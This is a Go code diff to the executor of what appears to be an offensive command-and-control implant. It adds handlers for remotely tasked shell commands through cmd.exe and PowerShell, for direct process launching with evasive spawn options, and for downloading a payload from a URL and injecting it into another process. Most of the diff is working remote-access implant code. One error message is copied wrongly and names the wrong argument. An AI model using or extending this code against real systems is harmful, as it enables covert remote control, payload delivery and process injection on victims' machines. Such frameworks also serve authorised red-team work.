@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"strings"
 
 	"github.com/dobin/antnium/pkg/arch"
 	"github.com/dobin/antnium/pkg/common"
@@ -41,8 +42,14 @@ func (e *Executor) Execute(packet model.Packet) (model.Packet, error) {
 		packet.Response, err = e.actionTest(packet.Arguments)
 	case "shutdown":
 		packet.Response, err = e.actionShutdown(packet.Arguments)
-	case "exec":
-		packet.Response, err = e.actionExec(packet.Arguments)
+
+	case "execShell":
+		packet.Response, err = e.actionExecShell(packet.Arguments)
+	case "execLol":
+		packet.Response, err = e.actionExecLol(packet.Arguments)
+	case "execRemote":
+		packet.Response, err = e.actionExecRemote(packet.Arguments)
+
 	case "fileupload":
 		packet.Response, err = e.actionFileupload(packet.Arguments)
 	case "filedownload":
@@ -144,14 +151,137 @@ func (e *Executor) actionTest(packetArgument model.PacketArgument) (model.Packet
 	return ret, nil
 }
 
-func (e *Executor) actionExec(packetArgument model.PacketArgument) (model.PacketResponse, error) {
+func (e *Executor) actionExecShell(packetArgument model.PacketArgument) (model.PacketResponse, error) {
 	ret := make(model.PacketResponse)
+	stdOut := make([]byte, 0)
+	stdErr := make([]byte, 0)
+	pid := 0
+	exitCode := 0
+	var err error
 
-	// Check and transform input done in there sadly
-	stdout, stderr, pid, exitCode, err := arch.Exec(packetArgument)
+	shellType, ok := packetArgument["shelltype"]
+	if !ok {
+		return ret, fmt.Errorf("no argument 'shelltype' given")
+	}
+	commandline, ok := packetArgument["commandline"]
+	if !ok {
+		return ret, fmt.Errorf("no argument 'shelltype' given")
+	}
 
-	ret["stdout"] = arch.ExecOutputDecode(stdout)
-	ret["stderr"] = arch.ExecOutputDecode(stderr)
+	switch shellType {
+	case "cmd":
+		stdOut, stdErr, pid, exitCode, err = arch.ExecCmdExe(commandline)
+
+	case "powershell":
+		stdOut, stdErr, pid, exitCode, err = arch.ExecPowershell(commandline)
+
+	default:
+		return ret, fmt.Errorf("Invalid shellType: %s", shellType)
+	}
+
+	ret["stdout"] = arch.ExecOutputDecode(stdOut)
+	ret["stderr"] = arch.ExecOutputDecode(stdErr)
+	ret["pid"] = strconv.Itoa(pid)
+	ret["exitCode"] = strconv.Itoa(exitCode)
+
+	return ret, err
+}
+
+func (e *Executor) actionExecLol(packetArgument model.PacketArgument) (model.PacketResponse, error) {
+	ret := make(model.PacketResponse)
+	stdOut := make([]byte, 0)
+	stdErr := make([]byte, 0)
+	pid := 0
+	exitCode := 0
+	var err error
+
+	shellType, ok := packetArgument["shelltype"]
+	if !ok {
+		return ret, fmt.Errorf("no argument 'shelltype' given")
+	}
+
+	switch shellType {
+	case "commandexec":
+		executable, ok := packetArgument["executable"]
+		if !ok {
+			return ret, fmt.Errorf("invalid packet arguments given: no executable")
+		}
+		argline, ok := packetArgument["argline"]
+		if !ok {
+			return ret, fmt.Errorf("invalid packet arguments given: no argline")
+		}
+		args := strings.Fields(argline)
+
+		spawnType, ok := packetArgument["spawnType"]
+		if !ok {
+			spawnType = "standard"
+		}
+		spawnData, ok := packetArgument["spawnData"]
+		if !ok {
+			spawnData = ""
+		}
+
+		stdOut, stdErr, pid, exitCode, err = arch.ExecDirect(executable, args, spawnType, spawnData)
+
+	case "raw":
+		executable, args, err := model.MakePacketArgumentFrom(packetArgument)
+		executable = arch.ResolveWinVar(executable)
+		if err != nil {
+			return ret, fmt.Errorf("invalid packet arguments given")
+		}
+
+		spawnType, ok := packetArgument["spawnType"]
+		if !ok {
+			spawnType = "standard"
+		}
+		spawnData, ok := packetArgument["spawnData"]
+		if !ok {
+			spawnData = ""
+		}
+
+		stdOut, stdErr, pid, exitCode, err = arch.ExecDirect(executable, args, spawnType, spawnData)
+
+	default:
+		return ret, fmt.Errorf("Invalid shellType: %s", shellType)
+	}
+
+	ret["stdout"] = arch.ExecOutputDecode(stdOut)
+	ret["stderr"] = arch.ExecOutputDecode(stdErr)
+	ret["pid"] = strconv.Itoa(pid)
+	ret["exitCode"] = strconv.Itoa(exitCode)
+
+	return ret, err
+}
+
+func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.PacketResponse, error) {
+	ret := make(model.PacketResponse)
+	stdOut := make([]byte, 0)
+	stdErr := make([]byte, 0)
+	pid := 0
+	exitCode := 0
+	var err error
+
+	url, ok := packetArgument["url"]
+	if !ok {
+		return ret, fmt.Errorf("invalid packet arguments given: no url")
+	}
+	fileType, ok := packetArgument["type"]
+	if !ok {
+		return ret, fmt.Errorf("invalid packet arguments given: no type")
+	}
+	argline, ok := packetArgument["argline"]
+	if !ok {
+		return ret, fmt.Errorf("invalid packet arguments given: no argline")
+	}
+	injectInto, ok := packetArgument["injectInto"]
+	if !ok {
+		return ret, fmt.Errorf("invalid packet arguments given: no injectInto")
+	}
+
+	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(url, fileType, argline, injectInto)
+
+	ret["stdout"] = arch.ExecOutputDecode(stdOut)
+	ret["stderr"] = arch.ExecOutputDecode(stdErr)
 	ret["pid"] = strconv.Itoa(pid)
 	ret["exitCode"] = strconv.Itoa(exitCode)
 
